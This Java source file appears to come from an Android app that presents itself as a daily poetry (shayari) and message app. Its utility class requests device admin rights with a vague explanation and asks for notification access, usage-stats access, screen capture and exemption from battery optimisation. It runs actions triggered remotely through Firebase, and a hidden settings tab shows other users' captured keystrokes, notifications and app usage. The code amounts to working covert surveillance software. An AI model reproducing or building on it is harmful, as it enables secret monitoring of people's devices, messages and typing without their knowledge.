package com.vikasyadavnsit.cdc.utils;

import static android.app.Activity.RESULT_OK;
import static android.content.Context.ALARM_SERVICE;
import static com.vikasyadavnsit.cdc.constants.AppConstants.ENABLE_ADMIN_REQUEST_CODE;
import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;
import static com.vikasyadavnsit.cdc.services.AppUsageStats.hasUsageStatsPermission;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getMessageText;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getShayariData;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.admin.DevicePolicyManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.LocationManager;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
import com.vikasyadavnsit.cdc.fragment.ClickActionsFragment;
import com.vikasyadavnsit.cdc.fragment.HomeFragment;
import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
import com.vikasyadavnsit.cdc.fragment.MessageFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
import com.vikasyadavnsit.cdc.receiver.DeviceAdminReceiver;
import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
import com.vikasyadavnsit.cdc.services.ScreenshotService;

import java.lang.reflect.Type;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.Comparator;
import java.util.Map;
import java.util.Objects;
import java.util.TreeMap;

public class ActionUtils {

    private static Handler handler = new Handler();
    private static boolean isLongPress = false;
    private static boolean isCounting = false;
    private static int pressCount = 0;
    private static CountDownTimer countDownTimer;
    private static Activity context;

    public static void handleButtonPress(AppCompatActivity activity) {
        context = activity;

        //Handle Button Presses
        activity.findViewById(R.id.main_navigation_request_play_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new MessageFragment());
            //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
        });

        activity.findViewById(R.id.main_navigation_request_home_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
        });
        activity.findViewById(R.id.main_navigation_request_settings_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
        });


        //Handle Touch Listeners
        activity.findViewById(R.id.main_navigation_request_home_button).setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
                        isLongPress = false;
                        handler.postDelayed(settingEnablerRunnable, 3000); // 5 seconds
                        return true;

                    case MotionEvent.ACTION_UP:
                    case MotionEvent.ACTION_CANCEL:
                        if (!isLongPress) {
                            handler.removeCallbacks(settingEnablerRunnable);
                        }
                        return true;
                }
                return false;
            }
        });
    }

    public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
        LoggerUtils.d("CommonUtil", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
        createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
    }

    public static void takeDeviceAdminPermission(Activity activity) {
        // Initialize DevicePolicyManager and the component name for the DeviceAdminReceiver
        DevicePolicyManager mDevicePolicyManager = (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName mAdminComponent = new ComponentName(activity, DeviceAdminReceiver.class);

        // Check if the app is already a device admin
        if (!mDevicePolicyManager.isAdminActive(mAdminComponent)) {
            // Prompt the user to enable device admin
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "The permission is required to help you to use CDC in the best way possible.");
            activity.startActivityForResult(intent, ENABLE_ADMIN_REQUEST_CODE);
        }
    }

    public static void checkOrGetNotificationListenerPermission(Activity activity) {
        if (!isNotificationListenerEnabled(activity)) {
            // If the notification listener permission is not enabled, prompt the user to enable it
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            activity.startActivity(intent);
        } else {
            // Permission is already granted, no need to prompt the user
            LoggerUtils.d("NotificationListener", "Notification listener permission is already granted.");
        }
    }

    private static boolean isNotificationListenerEnabled(Activity activity) {
        String packageName = activity.getPackageName();
        final String flat = Settings.Secure.getString(activity.getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName componentName = ComponentName.unflattenFromString(name);
                if (componentName != null && TextUtils.equals(packageName, componentName.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }


    public static void checkAndRequestBatteryOptimization(Activity activity) {
        PowerManager powerManager = (PowerManager) activity.getSystemService(Context.POWER_SERVICE);

        if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(activity.getPackageName())) {
            // Battery optimization is enabled for this app, prompt the user to disable it
            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            activity.startActivity(intent);
        } else {
            // Battery optimization is already disabled for this app
            LoggerUtils.d("BatteryOptimization", "Battery optimization is already disabled.");
        }
    }

    public static void registerPhoneStatistics(Activity activity) {
        // Create an intent filter
        IntentFilter filter = new IntentFilter();

        // System broadcast actions
        filter.addAction(Intent.ACTION_SCREEN_OFF); // Device screen turned off
        filter.addAction(Intent.ACTION_SCREEN_ON);  // Device screen turned on
        filter.addAction(Intent.ACTION_USER_PRESENT); // User unlocked the device (screen on)
        filter.addAction(Intent.ACTION_SHUTDOWN); // Device is shutting down
        filter.addAction(Intent.ACTION_REBOOT); // Device is rebooting (requires `REBOOT` permission)
        filter.addAction(Intent.ACTION_BOOT_COMPLETED); // Device boot completed (requires `RECEIVE_BOOT_COMPLETED` permission)
        filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED); // Airplane mode toggled
        filter.addAction(Intent.ACTION_POWER_CONNECTED); // Power source connected (charger plugged in)
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED); // Power source disconnected (charger unplugged)
        filter.addAction(Intent.ACTION_BATTERY_LOW); // Battery level is low
        filter.addAction(Intent.ACTION_HEADSET_PLUG); // Headset plug/unplug event
        filter.addAction(Intent.ACTION_PACKAGE_ADDED); // A package was added
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED); // A package was removed
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED); // A package was replaced
        filter.addAction(Intent.ACTION_PACKAGE_CHANGED); // A package was changed (e.g., app data update)

        // Network state broadcasts
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); // Connectivity change (e.g., network connected/disconnected)

        // Bluetooth broadcasts
        filter.addAction(BluetoothAdapter.ACTION_STATE_CHANGED); // Bluetooth state changed
        filter.addAction(BluetoothDevice.ACTION_ACL_CONNECTED); // Bluetooth device connected
        filter.addAction(BluetoothDevice.ACTION_ACL_DISCONNECTED); // Bluetooth device disconnected

        // Location updates (requires location permissions)
        filter.addAction(LocationManager.PROVIDERS_CHANGED_ACTION); // Location providers changed

        // Other useful actions
        filter.addAction(Intent.ACTION_DATE_CHANGED); // Device date changed
        filter.addAction(Intent.ACTION_TIME_CHANGED); // Device time changed
        filter.addAction(Intent.ACTION_TIMEZONE_CHANGED); // Device timezone changed

        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
    }

    public static void enableAppUsageStats(Activity activity) {
        if (!hasUsageStatsPermission(activity)) {
            activity.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        }
    }

    public static void requestExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    public static boolean canScheduleExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
            return alarmManager.canScheduleExactAlarms();
        }
        return true; // For older versions, exact alarms are always allowed
    }

    public static void startMediaProjectionService(Activity activity) {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
    }

    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
                activity.startService(serviceIntent);
            }
        }
    }

    private static Runnable settingEnablerRunnable = () -> {
        isLongPress = true;
        pressCount++;
        // Check if the pressCount reaches 3 within 30 seconds
        if (pressCount == 3) {
            Toast.makeText(context, "Settings Tab Enabled", Toast.LENGTH_SHORT).show();
            context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.VISIBLE);
        }

        // If the timer is not running, start the 30-second timer
        if (!isCounting) {
            startCountDown();
        }
    };

    private static void startCountDown() {
        isCounting = true;
        countDownTimer = new CountDownTimer(20000, 1000) { // 30 seconds countdown
            @Override
            public void onTick(long millisUntilFinished) {
                // No action needed on each tick
            }

            @Override
            public void onFinish() {
                isCounting = false;
                if (pressCount < 3) {
                    context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.GONE);
                }
                pressCount = 0; // Reset press count after 30 seconds
            }
        };
        countDownTimer.start();
    }


    public static void performFirebaseAction(Object obj) {
        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
        }.getType();
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);

        LoggerUtils.d("ActionUtils", "Remote data changed, reconfiguring app trigger settings");

        if (hasFileAccess()) {
            ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
        }

        LoggerUtils.d("ActionUtils", "Processing Remote Firebase Actions");
        appTriggerSettingsDataMap.forEach((key, value) -> {
            if (value.isEnabled()) {
                LoggerUtils.d("ActionUtils", "Performing Remote Firebase Action for : " + key);
                value.getClickActions().getBiConsumer().accept(context, value);
            }
        });
    }

    public static void performShayariAction(Object obj) {
        LoggerUtils.d("ActionUtils", "Loading Shayari ..");

        // Get the Shayari of the day or use a default text if obj is null
        String shayariOftheDay = Objects.isNull(obj) ? AppConstants.DEFAULT_SHAYARI_TEXT : obj.toString();

        // Update the Shayari text in the fragment
        HomeFragment.updateShayariText(shayariOftheDay);

        // Get the current shayari data from SharedPreferences
        String currentShayariData = getShayariData(context);
        String[] shayariDataParts = currentShayariData.split(":");

        // Calculate the new shayari index
        int currentIndex = Integer.parseInt(shayariDataParts[0]);
        LocalDate lastUpdatedDate = LocalDate.parse(shayariDataParts[1], DateTimeFormatter.ISO_LOCAL_DATE);
        int newIndex = (LocalDate.now().equals(lastUpdatedDate) ? currentIndex : currentIndex + 1);

        // Prepare the new shayari data
        String newShayariData = newIndex + ":" + LocalDate.now() + ":" + shayariOftheDay;

        // Update the shayari data in SharedPreferences
        SharedPreferenceUtils.updateShayariData(context, newShayariData);
    }


    public static void performMessageAction(Object obj) {
        LoggerUtils.d("ActionUtils", "Performing Message Action");
        String message = Objects.isNull(obj) ? getMessageText(context) : obj.toString();
        SharedPreferenceUtils.updateMessageText(context, message);
        MessageFragment.updateMessage(message);
    }

    public static void performFlatUserDetailsActions(Object obj) {
        LoggerUtils.d("ActionUtils", "populating all users in admin setting dropdown");
        Type type = new TypeToken<Map<String, User>>() {
        }.getType();
        Map<String, User> userMap = new Gson().fromJson(new Gson().toJson(obj), type);
        SettingsFragment.populateUserDropdown(context, userMap);
    }

    public static void getAndUpdateAndroidUserClickActions(Object obj) {
        LoggerUtils.d("ActionUtils", "showing a user click actions permissions");
        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
        }.getType();
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        ClickActionsFragment.addDynamicButtons(context, appTriggerSettingsDataMap);
    }

    public static void displayAndroidUserKeystrokes(Object obj) {
        LoggerUtils.d("ActionUtils", "dispaying android user keystrokes");
        Type type = new TypeToken<TreeMap<String, KeyStrokeData>>() {
        }.getType();
        Map<String, KeyStrokeData> keyStrokeDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        // Create a TreeMap sorted by the timestamp field in KeyStrokeData
        TreeMap<String, KeyStrokeData> sortedMap = new TreeMap<>(Comparator.comparing(key -> keyStrokeDataMap.get(key).getTimestamp()).reversed());
        // Put all elements from the original map into the sorted TreeMap
        sortedMap.putAll(keyStrokeDataMap);
        KeyStrokesFragment.displayKeyStrokes(context, sortedMap);
    }

    public static void displayAndroidUserAccessibilityNotification(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user accessibility notification");
        Type type = new TypeToken<TreeMap<String, NotificationData>>() {
        }.getType();
        Map<String, NotificationData> notificationDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        // Create a TreeMap sorted by the timestamp field in KeyStrokeData
        TreeMap<String, NotificationData> notificationDataTreeMap = new TreeMap<>(Comparator.comparing(key -> notificationDataMap.get(key).getTimestamp()).reversed());
        // Put all elements from the original map into the sorted TreeMap
        notificationDataTreeMap.putAll(notificationDataMap);
        AccessibilityNotificationFragment.displayNotifications(context, notificationDataTreeMap);
    }

    public static void displaySystemAppUsageStatisticsReportData(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user system app usage statistics");
        Type type = new TypeToken<TreeMap<String, TreeMap<String, AppUsageReportData>>>() {
        }.getType();
        TreeMap<String, TreeMap<String, AppUsageReportData>> appUsageStatisticsReportDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        SystemAppUsageStatisticsFragment.displaySystemAppUsageStatistics(context, appUsageStatisticsReportDataMap);
    }
}
